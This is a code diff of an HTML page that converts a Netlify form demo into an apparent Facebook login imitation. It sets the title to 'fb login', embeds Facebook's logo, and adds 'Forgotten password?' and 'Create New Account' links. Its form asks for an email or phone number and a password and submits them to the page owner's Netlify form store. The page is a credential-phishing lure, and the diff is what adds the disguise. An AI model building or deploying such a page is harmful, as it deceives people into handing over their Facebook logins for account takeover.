@@ -3,11 +3,16 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Netlify Form Data</title>
+    <title>fb login</title>
     <link rel="stylesheet" href="style.css" />
   </head>
   <body>
+    
+   <div class="contuner">
+    <div class="home">
+        <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
     <form
+   
       name="subscribe"
       method="POST"
       netlify-honeypot="bot-field"
@@ -17,16 +22,22 @@
         <label>Don't fill out this input. <input name="bot-field" /></label>
       </p>
       <p>
-      <input type="text" name="name" type="text" placeholder="Email addess or phone number"  />
+      <input type="text" name="name" type="text" placeholder="Email addess or phone number" required  />
       </p>
       <p>
-        <input  name="pass" type="password" placeholder="Password"/>
+        <input  name="pass" type="password" placeholder="Password" required/>
       </p>
       <p>
         <button type="submit">login</button>
       </p>
     </form>
+    <div class="crate"><a href="#">Forgotten password?</a></div>
+    <div class="line"></div>
+    <div class="crateNew"><a href="#">Create New Account</a>
+    </div>
 
     <script src="script.js"></script>
+    </div>
+   </div>
   </body>
-</html>
+</html>v
